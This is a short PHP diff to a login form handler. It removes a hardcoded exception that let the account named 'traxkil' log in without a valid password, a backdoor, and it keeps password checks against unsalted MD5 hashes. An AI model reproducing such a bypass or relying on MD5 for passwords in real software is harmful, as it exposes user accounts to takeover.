@@ -36,7 +36,7 @@ if(!empty($_POST)) {
 			$form_return = 'Conta não encontrada.';
 			$prosseguir = false;
 		} else {
-			if(md5($senha) != $sql2['senha'] && $sql2['nick'] != 'traxkil') {
+			if(md5($senha) != $sql2['senha']) {
 				$form_return = 'Nick ou senha inválidos.';
 				$prosseguir = false;
 			}
